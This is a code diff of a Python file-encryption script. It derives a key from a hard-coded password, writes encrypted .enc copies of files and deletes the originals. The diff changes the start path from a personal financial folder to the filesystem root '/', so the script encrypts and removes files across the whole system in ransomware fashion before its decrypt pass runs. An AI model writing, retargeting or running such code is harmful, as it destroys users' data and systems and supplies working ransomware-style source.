@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 from random import randint
 from os.path import getsize
 from os import remove
@@ -9,12 +10,11 @@ from getfiles import get_files,get_enc_files
 
 chunksize=64*1024
 
-
 password = 'chaitanyarahalkar'
 
 key = sha256((password).encode('utf-8')).digest()
 
-startpath = '/Users/chaitanyarahalkar/Downloads/Financial Information/'
+startpath = '/'
 
 def encrypt_file(filename,key):
 	enc_file = filename + '.enc' 
@@ -53,10 +53,14 @@ def decrypt_file(filename,key):
 			fout.truncate(size)
 	remove(filename)
 
-for file in get_files(startpath):
-	print('Encrypting file : ' + file)
-	encrypt_file(file,key)
+def main():
+	for file in get_files(startpath):
+		print('Encrypting file : ' + file)
+		encrypt_file(file,key)
 
-for file in get_enc_files(startpath):
-	print('Decrypting file : ' + file)
-	decrypt_file(file,key)
+	for file in get_enc_files(startpath):
+		print('Decrypting file : ' + file)
+		decrypt_file(file,key)
+
+if __name__ == '__main__':
+	main()
